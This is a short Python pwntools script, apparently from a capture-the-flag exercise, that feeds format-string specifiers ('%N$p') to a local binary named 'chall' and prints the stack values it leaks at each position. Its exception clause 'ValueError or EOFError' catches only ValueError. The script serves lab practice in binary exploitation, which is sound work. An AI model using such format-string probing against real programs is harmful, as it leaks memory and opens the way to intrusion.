from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./chall', checksec=False)

# Let's fuzz 100 values
for i in range(1,100):
    try:
        p = process(level='error')

        p.sendline('1_%{}$p'.format(i).encode())
        p.sendline('1')
        p.recvuntil(b'Calculating for A: ')
        result = p.recvline()
        print(str(i) + ': ' + str(result))
            
        p.close()
    except ValueError or EOFError:
        pass
